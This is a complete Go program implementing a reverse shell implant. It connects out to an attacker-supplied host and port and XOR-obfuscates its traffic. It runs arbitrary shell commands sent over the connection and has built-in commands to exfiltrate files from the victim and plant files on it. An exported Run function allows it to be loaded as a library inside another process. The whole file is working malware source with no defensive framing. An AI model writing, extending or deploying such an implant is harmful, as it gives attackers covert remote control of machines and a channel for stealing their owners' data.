package main

import (
    "C"
	"errors"
	"fmt"
	"os"
	"io"
	"runtime"
	"net"
	"os/exec"
	"strings"
	"crypto/md5"
	"strconv"
)

var ErrNoPath = errors.New("path required")
var ErrorJank = errors.New("Jank")
var ErrorMismatch = errors.New("Mismatched quotes")
var BUFFERSIZE = 1024
var key_count = 0

//export Run
func Run() {
    main()
}

func main() {

	conn, err := net.Dial("tcp", strings.Join(os.Args[1:],":"))
	if err != nil {os.Exit(1)}

	for {
		conn.Write(xor([]byte("gopreter> ")))
		// Read input from connection
		input, err := receiveInput(conn)
		if err != nil {
			continue
		}
		// Attempt to execute given command
		err = execInput(input,conn)
		// Display error if applicable
		if err != nil {
			conn.Write(xor([]byte(err.Error()+"\n")))
		}

	}
}

func receiveInput(conn net.Conn) (string,error) {
	var tmp_input []byte
	var result []byte
	for {
		tmp := make([]byte, 1)
		_,err := conn.Read(tmp)
		if err != nil {
			break
		} else {
			key_count = 0
			tmp_input = append(tmp_input,tmp[0])
			result = xor(tmp_input)
			if result[len(result)-1] == '\n'{
				break
			}
		}
	}
	input := string(result)
	input = strings.TrimSuffix(input, "\n")
	input = strings.TrimSuffix(input, "\r")

	// Skip an empty input.
	key_count = 0
	if input == "" {
		return "", ErrorJank
	}

	return input, nil

}

func xor(input []byte)(output []byte) {
	var key = []byte{80,117,110,120}
	for i := range input{
		output = append(output,input[i] ^ key[key_count])
		key_count = (key_count +1)%len(key)
	}
	return output
}

func execInput(input string, conn net.Conn) error {
	// Split the input separate the command and the arguments.
	args := strings.Split(input, " ")
	// Check for built-in commands.
	switch args[0] {
	case "cd":
		if len(args) < 2 {
			return ErrNoPath
		}
		// Change the directory and return the error.
		return os.Chdir(strings.Join(args[1:]," "))
	case "download":
		if len(args) < 2 {
			return ErrorJank
		}
		err := sendFileToClient(strings.Join(args[1:]," "),conn)
		if err != nil {
			return err
		}
	case "exit":
		os.Exit(0)
	case "upload":
		err := recvFile(strings.Join(args[1:]," "),conn)
		if err != nil {
			return err
		}
	default:
		args,err := mergeArgs(args)
		if err != nil{
			return err
		}
		if runtime.GOOS == "windows" && (args[0] == "dir" || args[0] == "ls" || args[0] == "del"){
			var new_args []string
			args[0] = "dir"
			new_args = append(new_args,"cmd")
			new_args = append(new_args,"/c")
			new_args = append(new_args,strings.Join(args[0:], " "))
			args = new_args
		}
		out,err := exec.Command(args[0], args[1:]...).CombinedOutput()
		if err != nil{
			return err
		}
		conn.Write(xor(out))
	}
	return nil
}

func mergeArgs(args []string) ([]string,error) {
		start := -1
		var newargs []string
		for i:=0; i<len(args); i++ {
			if strings.HasPrefix(args[i],"\""){
				if strings.HasSuffix(args[i],"\""){
					newargs = append(newargs,args[i])
				} else {
					start = i
				}
			}else if strings.HasSuffix(args[i],"\"") && start != -1{
				newargs = append(newargs,strings.Join(args[start:i+1]," "))
				lastidx := len(newargs)-1
				newargs[lastidx] = strings.TrimSuffix(newargs[lastidx],"\"")
				newargs[lastidx] = strings.TrimPrefix(newargs[lastidx],"\"")
				start = -1
			} else if start==-1 {
				newargs = append(newargs,args[i])
			}
		}
		if start != -1{
			return args,ErrorMismatch
		}
		return  newargs,nil
	}

func recvFile(serv_args string,conn net.Conn) error{
	serv_split := strings.Split(serv_args, "|")
	output_path := serv_split[0]
	desired_size,err := strconv.Atoi(serv_split[1])
	if err != nil {
		return ErrorJank
	}

	_, err = os.Stat(output_path)
	if err == nil {
		return ErrorJank
	}

	file, err := os.Create(output_path)
	if err != nil {
		fmt.Print(err.Error())
		return ErrorJank
	}

	challenge_response := strings.Join(serv_split,"|")

	conn.Write(xor([]byte(challenge_response)))
	key_count = 0
	tmp := make([]byte, 1)
	for i := 0; i < desired_size;{
		readlen,err := conn.Read(tmp)
		if err != nil {
			return ErrorJank
		}
		if strings.HasPrefix(string(tmp),"Jank"){
			break
		}
		file.Write(xor([]byte(tmp)))
		i = i + readlen
	}
	file.Close()

	file, err = os.Open(output_path)
	hash := md5.New()
	if _, err := io.Copy(hash, file); err != nil {
		return ErrorJank
	}
	key_count = 0
	conn.Write(xor(hash.Sum(nil)))


	return nil
}

func sendFileToClient(file_name string, conn net.Conn) error {

	file, err := os.Open(file_name)
	if err != nil {
		return ErrorJank
	}
	file_info, err := file.Stat()
	if err != nil {
		return ErrorJank
	}
	hash := md5.New()
	if _, err := io.Copy(hash, file); err != nil {
		return ErrorJank
	}
	file_size := strconv.FormatInt(file_info.Size(),10)
	file_hash := string(hash.Sum(nil))
	challenge := file_size + "|" + file_hash
	conn.Write(xor([]byte(challenge)))
	response, err := receiveInput(conn)
	if err != nil {
		return ErrorJank
	}
	resp_split := strings.Split(response, "|")
	if !(resp_split[0] == file_size) || !(resp_split[1] == string(file_hash)) {
		return ErrorJank
	}
	buffer := make([]byte, BUFFERSIZE)
	file.Seek(0,0)
	for {
		_, err = file.Read(buffer)
		if err == io.EOF {
			break
		}
		conn.Write(xor(buffer))
	}
	return nil
}

